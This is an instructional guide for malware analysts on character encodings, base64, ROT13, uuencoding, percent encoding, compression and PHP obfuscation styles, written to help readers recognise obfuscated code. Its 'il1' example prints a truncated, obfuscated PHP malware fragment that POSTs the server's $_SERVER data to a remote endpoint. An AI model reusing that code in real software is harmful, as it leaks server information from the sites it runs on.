# Encoding, Compression, and Obfuscation
{:.no_toc}

* TOC
{:toc}

## Character Encoding
First, there is character encoding. This is how numbers and letters are represented within the computer. The most common form of character encoding is ASCII, in which characters are stored as a single byte of data. Most of the time, your English webpages are written in ASCII, whether they are HTML, ASP, PHP, or JavaScript. Non-English webpages will also use ASCII characters if they share any characters with English, but the rest of the characters are what is called Unicode, an encoding that stores characters in 1 - 4 bytes of data, depending on where the character is in the list of Unicode characters.

* [https://kunststube.net/encoding/](https://kunststube.net/encoding/) has an incredible amount of detail on character encoding and is a good read if you're interested in the minute details.

Regardless of whether a character is ASCII or Unicode, however, it can be further represented as a binary, decimal, octal, or hexadecimal number in most programming languages.

For example: the capital letter A has the ASCII decimal value of 65 (it's the 65th character in ASCII). This means that all of the following examples _are_ the capital letter A:
* '65' => This converts to the capital letter A directly using most languages `chr()` function.
* '\x41' => This is the hexadecimal (\x followed by 2 hexadecimal characters) representation of 65. In some languages, you need to convert it to a decimal and then to a character. In some languages (PHP, for example), a string with hexadecimal values can be directly interpreted without first converting it.
* '\0101' => This is the octal (\ followed by 2 to 4 numbers between 0 and 7) representation of 65. Some languages require that octal numbers start with a `\0`, but not all do.
* '01000001' => This is the binary representation of 65. It must be converted to one of the above representations before it will show up as a capital A. This is rarely used and, outside of a specific case, I haven't seen it used in malware.

Similarly, a return (from hitting the return or enter key on your keyboard) doesn't _look_ like anything on the screen, but it is still a character (or two, if you're on a Windows system) that needs to be represented to the computer. The carriage return and line feed characters are control characters.
* carriage return (the character that tells the cursor to go back to the beginning of the line) is the ASCII character for '13' (or '\x0d' in hex and '\015' in octal)
* line feed (the character that tells the cursor to go down a line) is the ASCII character for '10' (or '\x0a' in hex and '\012' in octal)

## Text Encoding
Now that we have the individual character encoding covered, it's time to talk about text encodings. These differ from character encoding in that they are used to turn text with unpredictable breaks into a single, unbroken string.

Many programs, web browsers included, really do not like taking input with lots of spaces or control characters in them. In the early days of computing, control characters were literally that... characters used to _control_ the behavior of a program or computer. So, if you needed to pass data safely through a program, but needed a way to encode it in such a way that a program wouldn't be impacted by reading the control characters or think that the input ended because of a space or carriage return.

Over the years, there have been several different text encoding formats, but the ones that are most familiar are:
* base64
* ROT13
* uuencoding
* urlencode

### Base64 encoding
This is probably the most common encoding mechanism I see in web pages these days. It takes the vast array of different characters and converts them into the set of letters a through z (both capital and lowercase), the numbers 0 through 9, the `+` symbol, and the `/` symbol. Additionally, the `=` is used to make sure the length of the resulting string is divisible by 4.

This is different from character encoding because base64 encoding takes three 1-byte characters at a time, but writes them out as four characters in order to reduce the character set to printable characters regardless of the original characters used. As a result, while any given string of base64 may decode to a number of different original texts _out of context_, within the context of an entire base64 text, a group of characters will **always** decode to the same original text.

Examples:
* `aHR0cDovL3d3dy5nb29nbGUuY29tCiAgIGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20KICAgaHR0cDovL2dvb2dsZS5jb20KICAgaHR0cHM6Ly9nb29nbGUuY29t`
* `aHR0cDovL3d3dy5nb29nbGUuY29tCmh0dHBzOi8vd3d3Lmdvb2dsZS5jb20KaHR0cDovL2dvb2dsZS5jb20KaHR0cHM6Ly9nb29nbGUuY29t`
* `aHR0cDovL3d3dy5nb29nbGUuY29tCgpodHRwczovL3d3dy5nb29nbGUuY29tCgpodHRwOi8vZ29vZ2xlLmNvbQoKaHR0cHM6Ly9nb29nbGUuY29t`

The above examples have some similar characteristics _within_ themselves that, over time, will be second nature when looking at other strings. For example, we see `aHR0` showing up several times in each string. Based on experience, I _know_ that `aHR0` converts to `htt` and, more specifically, `aHR0cDov` converts to `http:/`.  As you see more of these as an analyst, you will find more base64 that you look at and simply know what it means.

[Wikipedia](https://en.wikipedia.org/wiki/Base64)

### ROT13 encoding
ROT13 encoding is a character substitution encoding mechanism where the all the _letters_ are replaced by the letter that is shifted 13 places away. All other characters are left alone by the language-native functions. This is, in essence, a (Caesar cipher)[https://en.wikipedia.org/wiki/Caesar_cipher] with a shift of 13.

This sort of encoding is easily recognizable if you see these strings:
* `riny` ==> `eval`
* `onfr64_qrpbqr` ==> `base64_decode`
* `cert_ercynpr` ==> `preg_replace`

This is rarely used as a primary encoding mechanism because it only changes the letters A-Z and doesn't alter other characters, leaving the structure of the code in place.

### uuencoding
Less commonly seen as a primary encoding mechanism, uuencoding (Unix-to-Unix encoding) is occasionally used as an intermediary to confuse people who are going over code manually. Text is encoded using the same methodology as base64 (three 8-bit characters are converted to four 6-bit characters), but the character set is different and file format is rather unique:
* The character set used is capital A through Z, 0 through 9, and the full set of ASCII punctuation marks.
* The file format consists of:
 * a header that contains: `begin` `<file permission mode>` `<original file name>`
 * a footer that contains a single backtick (grave accent) followed by a newline and then the word `end` and a newline.
 * every data line starts with a character that indicates the length of the original data encoded on the line plus 32
  * The standard line length (except the last line) contains 45 bytes of original data (60 encoded characters) and, as a result, starts with a `M`
  * The last line of data will have a different character at the beginning if the original data length was not divisible by 45.

[Wikipedia](https://en.wikipedia.org/wiki/Uuencoding)

### urlencoding (percent encoding)
Percent encoding (urlencoding) isn't used very often as a primary encoding mechanism in malware because it only partially encodes text if you are using the language built-in functions to do the encoding. It _is_ possible to fully encode a text, but it is rarely done in malware. Most people are familiar with seeing `%20` or `%3A%2F%2F` in URLs, though even that is less common as browsers tend to hide automatically convert those now.

The general idea of percent encoding is to only encode the characters that are **disallowed** in the URI scheme _or_ that have special meaning within the URI scheme. This is why spaces are encoded along with slashes, colons, and a number of other punctuation.

Percent encoding uses a percent sign (`%`) followed by the hexadecimal value of the character to be represented in order to encode.

[Wikipedia](https://en.wikipedia.org/wiki/Percent-encoding)

## Compression
In addition to encoding, authors will also compress their data as an additional step. Many times this is because they realize that encoding will increase the size of the data, so compression _must_ be good. The issue is that raw compressed data isn't "safe" to just put in a file that has uncompressed data in it. There are too many ways that can go wrong with all the control characters that get used in the compression. As a result, the compressed data then needs to be encoded to make it 'safe' to put in a text file, whether it's a hacker's malicious code or a theme author's copyright statement (or SEO links). And while compression _does_ make the file significantly smaller, the encoding of that compressed data actually makes it larger. The larger the original file, the longer it takes before you lose the compression savings, but you will eventually.

There are a number of compression schemes, but they largely depend on the language being used and, as a result, we will talk touch on them when we get to talking about specific functions in each language.

#### Example 1
I have a string that I want to encode: `echo("Hello World!\n");`

It is only 23 characters long, but it's a state-secret so I want to compress it and encode it.

The problem is that, after only a single compression / encoding cycle, the resulting data is already larger than the original. If I include the reversing mechanism in the data, my simple statement grows to 80 characters. If I assume my recipient knows how many times to reverse my process, the data only grows to 36 characters.

#### Example 2
I have a plain file of URLs and text. It is just a list of games and the URL to them on Steam. It is not even HTML. It comes in at 6300 bytes in size.

After a single compression / encoding cycle, it is under 2700 bytes in length. This seems like a great win, and it is, but it is also the **only** win. Every cycle after the first will make the resulting data larger than the previous. It may seems ridiculous, but after 36 of these cycles, the resulting data is larger than the original. You may say "But, Maarten, who is going to do that? No one is going to compress and encode their data that many times", but I've seen Wordpress theme credit links encoded far more than that (85 cycles is the record that I've personally decoded). Whether those links were from the original authors or from a group that removed the copyright and license checks from premium themes, I don't know, but they do it.

## Obfuscation
At it's core, obfuscation and encoding perform the same function, hiding the purpose of the code. On the simple end, obfuscation attempts to do this by changing function and variable names to be intentionally confusing. On the complex end, obfuscation can result in text that just appears to be random letters, numbers, and punctuation.

### Plain Obfuscation
Some of the more common forms of plain obfuscated code that I've seen are `o0_` and `Il1` code, where those three characters are used for all variable and function names in various combinations.

#### Examples
'il1' obfuscation tends to look similar to the below example, where most of the variables use the number 1, lowercase L, and upper or lower case I characters to deliberately confuse someone looking at the code and make it difficult to eyeball how the variables are being used.
~~~~~~
    <?php if(!@$incode!=false||!@$incode!=null){$vl='s';$serverid='[hash]';$liillilllil=time();
    function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){
    if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST',
    'header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));
    if($lilillilllllill=='yes'):...
~~~~~~

'o0_' obfuscation is similar, but uses uppercase O, the number 0, and the underscore character (`_`) to achieve the same end goal.
~~~~~~
    <?php
    //header('Content-Type:text/html; charset=utf-8');
    $O_OOO0__00='someval';
    $OO_OO000__='otherval';
    $O_O0O_0_O0='thirdval';
    $O_O0O0_O0_='etc';
    ...
~~~~~~

### Complex Obfuscation
Complex obfuscation utilizes multiple techniques to make analyzing code more difficult. Most of the time, this is simply a combination of encryption and various encoding and compression techniques. Occasionally, I've come across obfuscation that does additional work, whether that's arithmetic, concatenation, or using substrings. As we run into these in the examples, I'll go into more detail on what the particular sample is doing.

Some of the more complex obfuscation tools straddle the border between obfuscation and encryption. Many commercial encoders are fit this category and can't be easily decoded on an individual file basis. _Fortunately_, these commercial products are easy to detect. _Unfortunately_, if you (as a website owner) don't use these products and you see their files in your website, you will have a tough time figuring out what those files are doing by performing plain code analysis.

Some of the more common commercial obfuscators / encoders are:
* IonCube
* SourceGuardian

Additional obfuscators / encoders that I've seen commonly used by _malware_ include:
* FOPO (Free Online Php Obfuscator) and it's many variants
* AROHA PHP Encoder and it's variants
* Adilbo's Php Encoder and Obfuscator
